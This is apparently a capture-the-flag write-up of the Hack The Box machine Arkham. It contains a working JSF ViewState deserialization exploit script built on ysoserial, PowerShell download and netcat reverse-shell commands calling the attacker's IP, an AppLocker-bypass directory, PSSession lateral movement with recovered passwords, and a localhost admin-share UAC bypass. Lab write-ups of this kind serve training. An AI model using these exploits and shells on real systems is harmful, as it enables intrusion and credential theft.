---
icon: mango
cover: ../../../../.gitbook/assets/Screenshot 2026-04-01 002255.png
coverY: 35.17146188500452
coverHeight: 251
---

# HTB-ARKHAM

### Reconnaissance

kicked things off with rustscan, let it rip fast then feed the interesting ports into nmap for proper service detection.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ rustscan -a 10.129.228.116  blah blah 
Open 10.129.228.116:80
Open 10.129.228.116:135
Open 10.129.228.116:445
Open 10.129.228.116:8080
Open 10.129.228.116:49666
Open 10.129.228.116:49667
[...snip...]
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds  Windows Server 2019
8080/tcp open  http-proxy    Apache Tomcat 8.5.37
[...snip...]
```

two web ports and SMB open. IIS on 80 is usually nothing but the tomcat on 8080 caught my eye immediately java apps running on tomcat tend to have interesting attack surface. SMB is always worth poking at for null sessions on windows boxes.

### Website on 80

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

***

### Enumeration

```
┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$  smbclient --list //10.129.228.116/ -U ""
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        BatShare        Disk      Master Wayne's secrets
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.228.116 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

#### SMB Null Session

started with SMB since unauthenticated access there can save a lot of time

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ smbclient -N //10.129.228.116/batshare
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Feb  3 08:00:10 2019
  ..                                  D        0  Sun Feb  3 08:00:10 2019
  appserver.zip                       A  4046695  Fri Feb  1 01:13:37 2019
smb: \> get appserver.zip
getting file \appserver.zip of size 4046695 as appserver.zip (1078.9 KiloBytes/sec)
```

a zip file sitting in a share called `batshare`. grabbed it.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ unzip appserver.zip
Archive:  appserver.zip
  inflating: IMPORTANT.txt
  inflating: backup.img

┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ cat IMPORTANT.txt
Alfred, this is the backup image from our linux server. Please see that The Joker
or anyone else doesn't have unauthenticated access to it. - Bruce

┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ file backup.img
backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e
```

LUKS encrypted disk image. the note mentions Alfred and Bruce box is batman themed so the password is probably something batman related. worth trying a filtered wordlist rather than the whole rockyou.

#### Cracking the LUKS Image

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ grep -i batman /usr/share/wordlists/rockyou.txt > batman.txt

┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ sudo bruteforce-luks -t 10 -f batman.txt backup.img
```

<figure><img src="../../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

filtered rockyou down to \~900 batman-related passwords instead of 14 million cracked in about a minute. LUKS is designed to be slow so this kind of targeted filtering is important.

#### Mounting and Reading the Image

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ sudo cryptsetup open --type luks backup.img arkham
Enter passphrase for backup.img: [batmanforever]

┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ sudo mkdir -p /mnt/arkham && sudo mount /dev/mapper/arkham /mnt/arkham

┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ ls /mnt/arkham/
lost+found  Mask
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ cat /mnt/arkham/Mask/tomcat-stuff/web.xml.bak | grep -A1 "SECRET"
<param-name>org.apache.myfaces.SECRET</param-name>
<param-value>SnNGOTg3Ni0=</param-value>
--
<param-name>org.apache.myfaces.MAC_SECRET</param-name>
<param-value>SnNGOTg3Ni0=</param-value>
```

this is the key finding. the config tells us:

* **Encryption**: DES (default for Apache MyFaces)
* **MAC Algorithm**: HmacSHA1
* **Both keys**: `SnNGOTg3Ni0=` → decodes to `JsF9876-`

this means we can forge the `javax.faces.ViewState` parameter — the app will trust whatever serialized object we send it as long as we sign and encrypt it correctly with this key.

#### Web App Port 8080

<figure><img src="../../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

the site is a company page for "Mask". most links are dead but there's one functional page:

```
http://10.129.228.116:8080/userSubscribe.faces
```

the `.faces` extension means JavaServer Faces. submitting the form sends a POST with a `javax.faces.ViewState` hidden field — this is the JSF serialized state passed back and forth between client and server.

the vulnerability here is **Java Deserialization via JSF ViewState**. normally you'd need the encryption key to tamper with it — we have it. the app deserializes whatever we send without validating the object type, which means we can slip in a `CommonsCollections` gadget chain and get RCE.

***

### Exploitation - RCE via JSF ViewState Deserialization

#### Setup

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O ysoserial-all.jar

┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ sudo apt install openjdk-11-jdk -y

┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ pip install pycryptodome --break-system-packages
Requirement already satisfied: pycryptodome in /usr/local/lib/python3.13/dist-packages (3.23.0)
```

ysoserial needs Java 11 - Java 21 returns exit code 70 (illegal reflective access dies hard in newer versions). had to explicitly path to the java 11 binary in the script.

#### The Exploit

the flow is:

1. generate a malicious serialized Java object with ysoserial (`CommonsCollections5` gadget chain works here)
2. pad it to DES block boundary (8 bytes)
3. encrypt with DES-ECB using key `JsF9876-`
4. sign with HMAC-SHA1 using same key, append to end
5. base64 encode and POST as `javax.faces.ViewState`

```python
#!/usr/bin/env python3
import requests, subprocess, sys
from base64 import b64encode, b64decode
from Crypto.Cipher import DES
from Crypto.Hash import SHA, HMAC
from os import devnull

KEY = b64decode('SnNGOTg3Ni0=')  # JsF9876-

with open(devnull, 'w') as null:
    payload = subprocess.check_output(
        ['/usr/lib/jvm/java-11-openjdk-amd64/bin/java', '-jar',
         '/home/sn0x/HTB/Arkham/ysoserial-all.jar',
         'CommonsCollections5', sys.argv[1]], stderr=null)

# PKCS padding to 8-byte DES block boundary
pad = (8 - (len(payload) % 8)) % 8
padded = payload + (chr(pad)*pad).encode()

d = DES.new(KEY, DES.MODE_ECB)
enc = d.encrypt(padded)
sig = HMAC.new(KEY, enc, SHA).digest()
viewstate = b64encode(enc + sig)

sess = requests.session()
sess.get('http://10.129.228.116:8080/userSubscribe.faces')
sess.post('http://10.129.228.116:8080/userSubscribe.faces',
    data={
        'j_id_jsp_1623871077_1%3Aemail': 'test',
        'j_id_jsp_1623871077_1%3Asubmit': 'SIGN+UP',
        'j_id_jsp_1623871077_1_SUBMIT': '1',
        'javax.faces.ViewState': viewstate
    })
```

#### Testing RCE

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ sudo tcpdump -i tun0 icmp &

┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ python3 exploit.py "ping -n 2 10.10.14.104"
```

```
23:09:40.451101 IP 10.129.228.116 > 10.10.14.104: ICMP echo request, id 1, seq 1, length 40
23:09:40.455170 IP 10.10.14.104 > 10.129.228.116: ICMP echo reply, id 1, seq 1, length 40
23:09:41.469535 IP 10.129.228.116 > 10.10.14.104: ICMP echo request, id 1, seq 2, length 40
23:09:41.469557 IP 10.10.14.104 > 10.129.228.116: ICMP echo reply, id 1, seq 2, length 40
```

ping came back. RCE confirmed. `CommonsCollections5` gadget chain is the one that works here — tried others first, this one hit.

#### Getting a Shell (Alfred)

```bash
# terminal 1 — serve nc.exe
┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ cp /usr/share/windows-binaries/nc.exe .
┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 ...
10.129.228.116 - - [31/Mar/2026 23:11:34] "GET /nc.exe HTTP/1.1" 200 -

# terminal 2 — listener
┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ nc -lnvp 4444
Listening on 0.0.0.0 4444

# terminal 3 — upload nc
┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ python3 exploit.py "powershell -c iwr http://10.10.14.104/nc.exe -outfile C:\windows\System32\spool\drivers\color\n.exe"

# terminal 3 — trigger reverse shell
┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ python3 exploit.py "C:\windows\System32\spool\drivers\color\n.exe -e cmd 10.10.14.104 4444"
```

```
Connection received on 10.129.228.116 49734
Microsoft Windows [Version 10.0.17763.107]

C:\tomcat\apache-tomcat-8.5.37\bin> whoami
arkham\alfred
```

wrote nc to `C:\windows\System32\spool\drivers\color\` — this is an AppLocker-safe directory, writable by standard users and not subject to execution restrictions. classic applocker bypass path.

#### User Flag

```cmd
C:\Users\Alfred\Desktop> type user.txt
ba659321...
```

***

### Privesc - Alfred to Batman to Administrator

#### Grabbing backup.zip from Alfred

Alfred's downloads folder has a `backup.zip`. to get it off the box, set up an SMB share — direct copy is cleaner than base64 encoding.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ impacket-smbserver -smb2support -username df -password df share .
Impacket v0.14.0 - Copyright Fortra, LLC
[*] Config file parsed
[*] Callback added for UUID 4B324FC8...
```

on the Alfred shell:

```cmd
C:\Users\Alfred\Downloads\backups> net use \\10.10.14.104\share /u:df df
The command completed successfully.

C:\Users\Alfred\Downloads\backups> copy backup.zip \\10.10.14.104\share\
        1 file(s) copied.
```

SMB2 support is required here — Windows Server 2019 blocks unauthenticated guest access by default, so credentials are mandatory.

#### Extracting Batman's Password from the OST File

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ unzip backup.zip
Archive:  backup.zip
  inflating: alfred@arkham.local.ost

┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ sudo apt install pst-utils -y
pst-utils is already the newest version (0.6.76-1.3).

┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ readpst alfred@arkham.local.ost
Processing Folder "Drafts"
        "Drafts" - 1 items done, 0 items skipped.
[...snip...]

┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ ls
alfred@arkham.local.ost  Drafts.mbox  Drafts.mbox00000001  Drafts.mbox00000002
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ munpack Drafts.mbox
image001.png (image/png)

┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ eog image001.png
```

<figure><img src="../../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

the image is a screenshot showing Batman's password: **`Zx^#QZX+T!123`**

the OST is Alfred's Outlook offline folder. the Drafts folder had an unsent email to Batman telling him to stop forgetting his password with a screenshot of it attached. classic opsec failure.

#### Lateral Movement - Alfred to Batman via PSSession

batman is in the `Administrators` and `Remote Management Users` groups — PSSession lateral movement is possible.

from Alfred's shell, drop into PowerShell:

```cmd
C:\> powershell
```

```powershell
PS C:\> $username = "arkham\batman"
PS C:\> $password = "Zx^#QZX+T!123"
PS C:\> $secstr = New-Object -TypeName System.Security.SecureString
PS C:\> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
PS C:\> new-pssession -computername . -credential $cred

 Id Name       ComputerName  ComputerType  State   ConfigurationName    Availability
 -- ----       ------------  ------------  -----   -----------------    ------------
  2 WinRM2     localhost     RemoteMachine Opened  Microsoft.PowerShell Available

PS C:\> enter-pssession 2
[localhost]: PS C:\Users\Batman\Documents>
```

now inside the Batman PSSession, trigger another reverse shell — the PSSession shell is constrained and limited, better to get a proper cmd shell:

```powershell
[localhost]: PS C:\Users\Batman\Documents> \windows\System32\spool\drivers\color\n.exe -e cmd 10.10.14.104 443
```

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Arkham]
└─$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.228.116 49734
Microsoft Windows [Version 10.0.17763.107]

C:\Users\Batman\Documents> whoami
arkham\batman
```

#### Root Flag UNC Path Admin Share Bypass

batman is an Administrator but UAC is in the way running in a low integrity context. the quick path here is accessing the admin share over UNC localhost, which bypasses UAC token filtering entirely:

```cmd
C:\Users\Batman\Documents> type \\localhost\c$\users\administrator\desktop\root.txt
```

why this works: when accessing a network share — even to localhost — Windows uses the network token which carries full administrator privileges. UAC token splitting only applies to local interactive processes, not network authentication. so `\\localhost\c$` gives us full admin access even without a UAC bypass.

<figure><img src="../../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

***

### Attack Chain

```
SMB Null Session (BatShare)
        |
        v
appserver.zip → backup.img (LUKS)
        |
        v
bruteforce-luks (batmanforever)
        |
        v
Mount LUKS → web.xml.bak → MyFaces SECRET key (SnNGOTg3Ni0=)
        |
        v
Forge JSF ViewState (DES-ECB + HMAC-SHA1)
        |
        v
ysoserial CommonsCollections5 → RCE
        |
        v
Reverse Shell → arkham\alfred (User Flag)
        |
        v
Alfred Downloads → backup.zip → alfred@arkham.local.ost
        |
        v
readpst + munpack → image001.png → Batman password (Zx^#QZX+T!123)
        |
        v
PSSession as Batman → nc reverse shell
        |
        v
\\localhost\c$ UNC share → UAC bypass → Root Flag
```

***

### Techniques I Used

| Technique            | Detail                                                                      |
| -------------------- | --------------------------------------------------------------------------- |
| SMB Null Session     | Anonymous read access to BatShare                                           |
| LUKS Brute Force     | `bruteforce-luks`, targeted batman wordlist from rockyou                    |
| Java Deserialization | JSF ViewState, Apache MyFaces, known gadget chain                           |
| Gadget Chain         | ysoserial `CommonsCollections5`                                             |
| Crypto               | DES-ECB encryption + HMAC-SHA1 signing, key from config backup              |
| AppLocker Bypass     | Writing/executing from `C:\windows\System32\spool\drivers\color\`           |
| OST Parsing          | `readpst` + `munpack` to extract attachments from Outlook offline folder    |
| Lateral Movement     | PowerShell PSSession with stolen credentials                                |
| UAC Bypass           | UNC localhost admin share (`\\localhost\c$`) bypasses token filtering       |
| SMB File Transfer    | `impacket-smbserver` with SMB2 + credentials (guest blocked on Server 2019) |

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
